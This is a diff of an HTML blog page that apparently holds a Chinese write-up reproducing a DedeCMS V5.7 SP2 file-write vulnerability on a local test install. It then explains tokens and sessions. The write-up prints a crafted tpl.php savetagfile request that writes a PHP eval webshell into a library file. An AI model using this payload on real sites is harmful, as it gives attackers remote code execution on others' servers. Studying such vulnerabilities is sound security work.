@@ -371,7 +371,9 @@
       
 
       
-        <p>CMS漏洞复现：<br><a id="more"></a></p>
+        <p>CMS漏洞复现：</p>
+<a id="more"></a>
+
 <hr>
 <ul>
 <li>题目：F:\phpstudy\PHPTutorial\WWW\DedeCMS-V5.7-UTF8-SP2\uploads\dede</li>
@@ -384,8 +386,7 @@
 <ul>
 <li>发现$action参数方法，实验修改$action值发现当?action=upload时发现页面</li>
 </ul>
-<pre><code>http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/dede/tpl.php?action=upload
-</code></pre><p>-试着提交一个文件</p>
+<pre><code>http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/dede/tpl.php?action=upload</code></pre><p>-试着提交一个文件</p>
 <p>-看看源代码吧~</p>
 <p>获取到隐藏的token<br>返回查看代码发现下面的代码</p>
 <pre><code>else if($action==&apos;savetagfile&apos;)
@@ -402,16 +403,13 @@ $content = stripslashes($content);
 $truefile = DEDEINC.&apos;/taglib/&apos;.$filename;
 $fp = fopen($truefile, &apos;w&apos;);
 fwrite($fp, $content);
-fclose($fp);
-</code></pre><h2 id="发现没有对-content的输入进行过滤"><a href="#发现没有对-content的输入进行过滤" class="headerlink" title="发现没有对$content的输入进行过滤"></a>发现没有对$content的输入进行过滤</h2><pre><code>//正则匹配可查看 
-</code></pre><p><a href="https://www.zhihu.com/question/48219401/answer/742444326?utm_source=qq&amp;utm_medium=social&amp;utm_oi=1022060751548219392&amp;hb_wx_block=0" target="_blank" rel="noopener">https://www.zhihu.com/question/48219401/answer/742444326?utm_source=qq&amp;utm_medium=social&amp;utm_oi=1022060751548219392&amp;hb_wx_block=0</a></p>
+fclose($fp);</code></pre><h2 id="发现没有对-content的输入进行过滤"><a href="#发现没有对-content的输入进行过滤" class="headerlink" title="发现没有对$content的输入进行过滤"></a>发现没有对$content的输入进行过滤</h2><pre><code>//正则匹配可查看 </code></pre><p><a href="https://www.zhihu.com/question/48219401/answer/742444326?utm_source=qq&amp;utm_medium=social&amp;utm_oi=1022060751548219392&amp;hb_wx_block=0" target="_blank" rel="noopener">https://www.zhihu.com/question/48219401/answer/742444326?utm_source=qq&amp;utm_medium=social&amp;utm_oi=1022060751548219392&amp;hb_wx_block=0</a></p>
 <hr>
 <pre><code>Preg_match()函数是正则匹配的函数，里面写上匹配的规则，匹配所
 
 有包含一个以上的字母数字下划线和横杠，后面的\.意思是匹配小数点，i
 
-表示大小写不敏感
-</code></pre><p>preg_replace 函数执行一个正则表达式的搜索和替换。</p>
+表示大小写不敏感</code></pre><p>preg_replace 函数执行一个正则表达式的搜索和替换。</p>
 <pre><code>语法
 mixed preg_replace ( mixed $pattern , mixed 
 
@@ -436,16 +434,14 @@ $limit: 可选，对于每个模式用于每个 subject 字符串的最大可替
 
 换次数。 默认是-1（无限制）。
 
-$count: 可选，为替换执行的次数。
-</code></pre><p>传入</p>
+$count: 可选，为替换执行的次数。</code></pre><p>传入</p>
 <pre><code>action=savetagfile
 
 token=0859045cdede6e8183d740b42c4a2a37
 
 filename=123.lib.php
 
-content=%3C?php%20@eval($_POST[%27xxx%E2%80%99]);?%3
-</code></pre><p>因此构造</p>
+content=%3C?php%20@eval($_POST[%27xxx%E2%80%99]);?%3</code></pre><p>因此构造</p>
 <pre><code>http：//127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/dede/
 
 tpl.php?
@@ -454,8 +450,7 @@ action=savetagfile&amp;token=0859045cdede6e8183d740b42c4a2a37&amp;
 
 filename=123.lib.php&amp;content=%3C?php%20@eval($_POST[%27xxx
 
-%E2%80%99]);?%3E
-</code></pre><h2 id="注意token具有时效性！！！"><a href="#注意token具有时效性！！！" class="headerlink" title="注意token具有时效性！！！"></a>注意token具有时效性！！！</h2><pre><code>token的意思是“令牌”，是服务端生成的一串字符串，作为客户端进行
+%E2%80%99]);?%3E</code></pre><h2 id="注意token具有时效性！！！"><a href="#注意token具有时效性！！！" class="headerlink" title="注意token具有时效性！！！"></a>注意token具有时效性！！！</h2><pre><code>token的意思是“令牌”，是服务端生成的一串字符串，作为客户端进行
 
 请求的一个标识。
 
@@ -470,8 +465,7 @@ filename=123.lib.php&amp;content=%3C?php%20@eval($_POST[%27xxx
 
 sign（签名，token的前几位以哈希算法压缩成的一定长度的十六进制字符
 
-串。为防止token泄露）。
-</code></pre><hr>
+串。为防止token泄露）。</code></pre><hr>
 <h2 id="身份认证概述"><a href="#身份认证概述" class="headerlink" title="身份认证概述"></a>身份认证概述</h2><p>由于HTTP是一种没有状态的协议，它并不知道是谁访问了我们的应用。这里把用户看成是客户端，客户端使用用户名还有密码通过了身份验证，不过下次这个客户端再发送请求时候，还得再验证一下。</p>
 <p>通用的解决方法就是，当用户请求登录的时候，如果没有问题，在服务端生成一条记录，在这个记录里可以说明登录的用户是谁，然后把这条记录的id发送给客户端，客户端收到以后把这个id存储在cookie里，下次该用户再次向服务端发送请求的时候，可以带上这个cookie，这样服务端会验证一下cookie里的信息，看能不能在服务端这里找到对应的记录，如果可以，说明用户已经通过了身份验证，就把用户请求的数据返回给客户端。</p>
 <p>以上所描述的过程就是利用session，那个id值就是sessionid。我们需要在服务端存储为用户生成的session，这些session会存储在内存，磁盘，或者数据库。</p>
